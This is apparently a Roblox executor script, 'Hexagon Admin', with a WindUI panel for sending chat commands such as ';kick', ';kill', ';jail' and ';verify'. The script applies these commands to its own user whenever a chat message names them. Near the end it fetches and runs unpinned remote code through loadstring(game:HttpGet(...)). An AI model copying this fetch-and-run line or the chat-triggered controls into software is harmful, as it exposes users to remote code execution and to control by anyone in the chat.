local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Valores
local playerOriginalSpeed = {}
local jaulas = {}
local jailConnections = {}
        
-- Envia comando no chat (usa TextChannels)
local function EnviarComando(comando, alvo)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
    end
end

-- Função que processa cada mensagem recebida (originais e locais)
local function ProcessarMensagem(msgText, authorName)
    if not msgText or not authorName then return end

    local comandoLower = msgText:lower()
    local targetLower = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    -- COMANDOS QUE AFETAM O LOCAL PLAYER (verifica se o comando inclui o nome do local player)
    if comandoLower:match(";kick%s+" .. targetLower) then
        LocalPlayer:Kick("You have been kicked by Hexagon Client")
    end

    if comandoLower:match(";kill%s+" .. targetLower) then
        if character then character:BreakJoints() end
    end

    if comandoLower:match(";killplus%s+" .. targetLower) then
        if character then
            character:BreakJoints()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i=1,5 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(6,6,6)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = Workspace
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5,1e5,1e5)
                    bv.Parent = part
                    game.Debris:AddItem(part,3)
                end
            end
        end
    end

    if comandoLower:match(";fling%s+" .. targetLower) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)})
                tween:Play()
            end
        end
    end

    if comandoLower:match(";freeze%s+" .. targetLower) then
        if humanoid then
            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0
        end
    end

    if comandoLower:match(";unfreeze%s+" .. targetLower) then
        if humanoid then
            humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
        end
    end

    if comandoLower:match(";jail%s+" .. targetLower) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local pos = root.Position
                jaulas[targetLower] = {}

                local function criarPart(cf,s)
                    local p = Instance.new("Part")
                    p.Anchored = true
                    p.Size = s
                    p.CFrame = cf
                    p.Transparency = 0.5
                    p.Color = Color3.fromRGB(0,0,0)
                    p.Parent = Workspace
                    table.insert(jaulas[targetLower], p)
                end

                criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
                criarPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
                criarPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
                criarPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
                criarPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
                criarPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))

                jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
                    if character and root then
                        if (root.Position - pos).Magnitude > 5 then
                            root.CFrame = CFrame.new(pos)
                        end
                    end
                end)
            end
        end
    end

    if comandoLower:match(";unjail%s+" .. targetLower) then
        if jaulas[targetLower] then
            for _, v in pairs(jaulas[targetLower]) do
                if v and v.Destroy then pcall(v.Destroy, v) end
            end
            jaulas[targetLower] = nil
        end
        if jailConnections[targetLower] then
            jailConnections[targetLower]:Disconnect()
            jailConnections[targetLower] = nil
        end
    end

    -- COMANDO UNIVERSAL ;verify -> faz o local player enviar Hexagon_####
    if comandoLower:match("^;verify") then
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync("Hexagon_####")
        end
    end
end

-- Conectar canais de chat existentes e futuros
local function ConectarCanal(canal)
    if not canal or not canal.IsA then return end
    if not canal:IsA("TextChannel") then return end
    canal.MessageReceived:Connect(function(msg)
        -- msg.Text e msg.TextSource
        local text = msg.Text
        local source = msg.TextSource and msg.TextSource.Name
        if text and source then
            ProcessarMensagem(text, source)
        end
    end)
end

-- Conecta canais já existentes
for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
    ConectarCanal(ch)
end

-- Conecta canais novos
TextChatService.TextChannels.ChildAdded:Connect(function(ch)
    ConectarCanal(ch)
end)

--// Painel Hexagon (WindUI)
local WindUILib = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
local Window = WindUILib:CreateWindow({
        Title = "Hexagon Admin",
        Icon =  "rbxassetid://ID",
        Author = "by Nova",
        Size = UDim2.fromOffset(580,460),
        Transparent = true,
        Theme = "Dark",
})

local AdmTab = Window:Tab({ Title = "Admin", Icon = "crown", Locked = false })
local Section = AdmTab:Section({ Title = "Admin Commands", Icon = "user-cog", Opened = true })

local function getPlayersList()
local t = {}
for _, p in ipairs(Players:GetPlayers()) do
        table.insert(t, p.Name)
end
return t
end

local TargetName
local Dropdown = Section:Dropdown({
        Title = "Select Player",
        Values = getPlayersList(),
        Value = "",
        Callback = function(opt) TargetName = opt end
})

Players.PlayerAdded:Connect(function()
Dropdown:SetValues(getPlayersList())
end)
Players.PlayerRemoving:Connect(function()
Dropdown:SetValues(getPlayersList())
end)

local comandos = { "kick","kill","killplus","fling","freeze","unfreeze","jail","unjail","verify" }
for _, cmd in ipairs(comandos) do
Section:Button({
        Title = cmd:lower(),
        Desc = "Script for ;"..cmd.." - Target",
        Callback = function()
        if cmd == "verify" then
                -- verify é universal, não precisa de alvo
                EnviarComando("verify", "")
        else
                if TargetName and TargetName ~= "" then
                EnviarComando(cmd, TargetName)
                else
                warn("Nenhum jogador selecionado!")
            end
        end
end
})
end
